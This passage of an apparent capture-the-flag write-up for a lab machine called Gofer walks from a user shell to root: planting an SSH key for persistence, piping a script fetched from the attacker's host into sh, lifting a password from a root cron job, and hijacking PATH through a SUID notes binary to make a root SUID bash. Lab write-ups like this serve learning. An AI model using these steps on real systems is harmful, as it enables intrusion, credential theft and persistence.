jhudson:x:1000:1000:Jocelyn Hudson,,,:/home/jhudson:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postfix:x:106:113::/var/spool/postfix:/usr/sbin/nologin
jdavis:x:1001:1001::/home/jdavis:/bin/bash
tbuckley:x:1002:1002::/home/tbuckley:/bin/bash
ablake:x:1003:1003::/home/ablake:/bin/bash
tcpdump:x:107:117::/nonexistent:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
1
```

## user.txt

```c
jhudson@gofer:/usr/bin$ cat /home/jhudson/user.txt
cat /home/jhudson/user.txt
82edb22fc389758a3c75dfceeab6acc4
```

## Persistence

```c
jhudson@gofer:~$ mkdir .ssh
mkdir .ssh
jhudson@gofer:~$ cd .ssh
cd .ssh
jhudson@gofer:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' > authorized_keys
<fYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' > authorized_keys
```

```c
$ ssh jhudson@10.129.132.88
The authenticity of host '10.129.132.88 (10.129.132.88)' can't be established.
ED25519 key fingerprint is SHA256:B4ubLJ0tKmo+Ez41KPcVqNSqcv5f72LlajOYxybaY7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.132.88' (ED25519) to the list of known hosts.
Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Jul 27 11:56:22 2023 from 10.10.14.23
jhudson@gofer:~$
```

## Enumeration

### LinPEAS

```c
$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20230618-1fa055b6/linpeas.sh
--2023-07-29 22:15:58--  https://github.com/carlospolop/PEASS-ng/releases/download/20230618-1fa055b6/linpeas.sh
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/9edc6ec5-df76-4815-af8b-afb99bc40858?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230729%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230729T221559Z&X-Amz-Expires=300&X-Amz-Signature=8254a2e309815fd6d0639f525c9f39d048cafa87a6bd35f2af4f252ac4663ddb&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2023-07-29 22:15:59--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/9edc6ec5-df76-4815-af8b-afb99bc40858?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230729%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230729T221559Z&X-Amz-Expires=300&X-Amz-Signature=8254a2e309815fd6d0639f525c9f39d048cafa87a6bd35f2af4f252ac4663ddb&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836054 (816K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 816.46K  4.69MB/s    in 0.2s    

2023-07-29 22:15:59 (4.69 MB/s) - ‘linpeas.sh’ saved [836054/836054]
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
jhudson@gofer:/usr/bin$ id
id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
```

```c
jhudson@gofer:/dev/shm$ curl http://10.10.16.14/linpeas.sh | sh
```

```c
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 47 Nov  3  2022 /etc/apache2/.htpasswd                                                                                                                                                                               
tbuckley:$apr1$YcZ<--- SNIP --->jLh/
```

### PSPY

```c
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
--2023-07-29 22:24:54--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230729%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230729T222454Z&X-Amz-Expires=300&X-Amz-Signature=dd160050ec9f2ace1ae85a1aee67abdf223d047f706bf85bc5fd50b13c5a0a8b&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2023-07-29 22:24:54--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230729%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230729T222454Z&X-Amz-Expires=300&X-Amz-Signature=dd160050ec9f2ace1ae85a1aee67abdf223d047f706bf85bc5fd50b13c5a0a8b&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[========================================================================================================================================>]   2.96M  11.8MB/s    in 0.3s    

2023-07-29 22:24:55 (11.8 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

```c
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
══╣ Current shell capabilities                                                                                                                                                                                                              
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
```

## Privilege Escalation to tbuckley

```c
jhudson@gofer:/dev/shm$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/07/29 23:25:39 CMD: UID=1000  PID=17883  | ./pspy64
```

```c
2023/07/29 23:38:01 CMD: UID=0     PID=18383  | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP<--- SNIP --->eti
```

| Username | Password |
| --- | --- |
| tbuckley | ooP<--- SNIP --->eti |

```c
$ ssh tbuckley@10.129.132.88
tbuckley@10.129.132.88's password: 
Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
tbuckley@gofer:~$
```

## Pivoting

```c
tbuckley@gofer:~$ id
uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
```

```c
tbuckley@gofer:~$ sudo -l
-bash: sudo: command not found
```

```c
tbuckley@gofer:~$ find / -group dev 2>/dev/null
/usr/local/bin/notes
```

```c
tbuckley@gofer:~$ ls -la /usr/local/bin/notes
-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes
```

```c
tbuckley@gofer:~$ /usr/local/bin/notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice:
```

## Buffer Overflow on the notes Binary

```c
tbuckley@gofer:~$ mkdir bin
```

```c
tbuckley@gofer:~$ cd bin
```

```c
tbuckley@gofer:~/bin$ vi tar
```

```c
tbuckley@gofer:~/bin$ cat tar
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
echo rooted!
```

```c
tbuckley@gofer:~/bin$ chmod +x tar
```

```c
tbuckley@gofer:~/bin$ export PATH=~/bin:$PATH
```

```c
tbuckley@gofer:~/bin$ echo $PATH
/home/tbuckley/bin:/home/tbuckley/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

```c
tbuckley@gofer:~/bin$ /usr/local/bin/notes 
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 1

Choose an username: foobar

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 3

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 4

Write your note:
AAAAAAAAAAAAAAAAAAAAAAAAadmin
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 8

Access granted!
rooted!
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 9
```

```c
tbuckley@gofer:~/bin$ ls -la /tmp/bash 
-rwsr-sr-x 1 root root 1234376 Jul 30 00:13 /tmp/bash
```

## root.txt

```c
tbuckley@gofer:~/bin$ /tmp/bash -p
bash-5.1# cat /root/root.txt
32f7de01f589fbab0c36ca31894f2d2a
```
